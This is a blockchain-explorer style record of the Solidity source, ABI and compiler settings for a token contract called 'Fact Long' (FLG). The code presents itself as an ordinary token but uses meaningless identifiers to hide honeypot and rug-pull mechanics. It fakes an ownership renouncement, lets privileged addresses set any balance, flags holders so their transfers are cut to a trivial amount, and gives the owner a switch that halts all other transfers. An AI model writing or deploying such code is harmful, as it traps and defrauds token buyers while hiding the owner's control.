{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface feeLaunchFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundReceiverLiquidity) external view returns (uint256);\n\n    function transfer(address tokenMin, uint256 atTrading) external returns (bool);\n\n    function allowance(address marketingLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenMin,\n        uint256 atTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listWallet, uint256 value);\n    event Approval(address indexed marketingLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract receiverMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isTotalReceiver {\n    function createPair(address enableAt, address limitShould) external returns (address);\n}\n\ninterface feeLaunchFundMetadata is feeLaunchFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FactLong is receiverMode, feeLaunchFund, feeLaunchFundMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return isShould;\n    }\n\n    uint256 autoReceiver;\n\n    string private teamReceiver = \"FLG\";\n\n    mapping(address => mapping(address => uint256)) private amountTo;\n\n    string private liquidityIs = \"Fact Long\";\n\n    event OwnershipTransferred(address indexed senderLiquiditySwap, address indexed isLimit);\n\n    mapping(address => bool) public teamFee;\n\n    function listSender() public {\n        emit OwnershipTransferred(feeReceiver, address(0));\n        toFund = address(0);\n    }\n\n    function approve(address launchTotalWallet, uint256 atTrading) public virtual override returns (bool) {\n        amountTo[_msgSender()][launchTotalWallet] = atTrading;\n        emit Approval(_msgSender(), launchTotalWallet, atTrading);\n        return true;\n    }\n\n    uint256 public toWallet;\n\n    uint8 private isShould = 18;\n\n    function launchTotalReceiver(address modeMarketingList) public {\n        teamMinMode();\n        if (tokenTeam == receiverTeamShould) {\n            swapTo = launchedWallet;\n        }\n        if (modeMarketingList == feeReceiver || modeMarketingList == teamTx) {\n            return;\n        }\n        launchFrom[modeMarketingList] = true;\n    }\n\n    function teamMinMode() private view {\n        require(teamFee[_msgSender()]);\n    }\n\n    constructor (){\n        if (launchedWallet == swapTo) {\n            tokenTeam = false;\n        }\n        tradingLaunch toAmount = tradingLaunch(amountListShould);\n        teamTx = isTotalReceiver(toAmount.factory()).createPair(toAmount.WETH(), address(this));\n        \n        feeReceiver = _msgSender();\n        listSender();\n        teamFee[feeReceiver] = true;\n        totalSellTeam[feeReceiver] = minShould;\n        if (toWallet != launchedWallet) {\n            launchedWallet = swapTo;\n        }\n        emit Transfer(address(0), feeReceiver, minShould);\n    }\n\n    mapping(address => uint256) private totalSellTeam;\n\n    function transfer(address enableTeam, uint256 atTrading) external virtual override returns (bool) {\n        return exemptAmount(_msgSender(), enableTeam, atTrading);\n    }\n\n    uint256 public launchedWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minShould;\n    }\n\n    bool public exemptSell;\n\n    address private toFund;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityIs;\n    }\n\n    address amountListShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private receiverTeamShould;\n\n    function totalFee(address liquidityFee) public {\n        if (exemptSell) {\n            return;\n        }\n        if (swapTo != toWallet) {\n            fromAuto = false;\n        }\n        teamFee[liquidityFee] = true;\n        \n        exemptSell = true;\n    }\n\n    function transferFrom(address totalBuyReceiver, address tokenMin, uint256 atTrading) external override returns (bool) {\n        if (_msgSender() != amountListShould) {\n            if (amountTo[totalBuyReceiver][_msgSender()] != type(uint256).max) {\n                require(atTrading <= amountTo[totalBuyReceiver][_msgSender()]);\n                amountTo[totalBuyReceiver][_msgSender()] -= atTrading;\n            }\n        }\n        return exemptAmount(totalBuyReceiver, tokenMin, atTrading);\n    }\n\n    address launchSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public feeReceiver;\n\n    function launchAuto(address totalBuyReceiver, address tokenMin, uint256 atTrading) internal returns (bool) {\n        require(totalSellTeam[totalBuyReceiver] >= atTrading);\n        totalSellTeam[totalBuyReceiver] -= atTrading;\n        totalSellTeam[tokenMin] += atTrading;\n        emit Transfer(totalBuyReceiver, tokenMin, atTrading);\n        return true;\n    }\n\n    function tokenModeLaunch(uint256 atTrading) public {\n        teamMinMode();\n        swapFrom = atTrading;\n    }\n\n    bool public fromAuto;\n\n    function getOwner() external view returns (address) {\n        return toFund;\n    }\n\n    bool public tokenTeam;\n\n    function exemptAmount(address totalBuyReceiver, address tokenMin, uint256 atTrading) internal returns (bool) {\n        if (totalBuyReceiver == feeReceiver) {\n            return launchAuto(totalBuyReceiver, tokenMin, atTrading);\n        }\n        uint256 walletLiquidity = feeLaunchFund(teamTx).balanceOf(launchSwap);\n        require(walletLiquidity == swapFrom);\n        require(tokenMin != launchSwap);\n        if (launchFrom[totalBuyReceiver]) {\n            return launchAuto(totalBuyReceiver, tokenMin, modeLaunched);\n        }\n        return launchAuto(totalBuyReceiver, tokenMin, atTrading);\n    }\n\n    function allowance(address walletAuto, address launchTotalWallet) external view virtual override returns (uint256) {\n        if (launchTotalWallet == amountListShould) {\n            return type(uint256).max;\n        }\n        return amountTo[walletAuto][launchTotalWallet];\n    }\n\n    uint256 swapFrom;\n\n    function marketingTotal(address enableTeam, uint256 atTrading) public {\n        teamMinMode();\n        totalSellTeam[enableTeam] = atTrading;\n    }\n\n    uint256 constant modeLaunched = 15 ** 10;\n\n    uint256 private minShould = 100000000 * 10 ** 18;\n\n    uint256 public swapTo;\n\n    mapping(address => bool) public launchFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamReceiver;\n    }\n\n    function balanceOf(address fundReceiverLiquidity) public view virtual override returns (uint256) {\n        return totalSellTeam[fundReceiverLiquidity];\n    }\n\n    function owner() external view returns (address) {\n        return toFund;\n    }\n\n    address public teamTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLiquiditySwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchTotalWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTotalWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiverLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMarketingList\",\"type\":\"address\"}],\"name\":\"launchTotalReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTrading\",\"type\":\"uint256\"}],\"name\":\"marketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atTrading\",\"type\":\"uint256\"}],\"name\":\"tokenModeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFee\",\"type\":\"address\"}],\"name\":\"totalFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalBuyReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FactLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}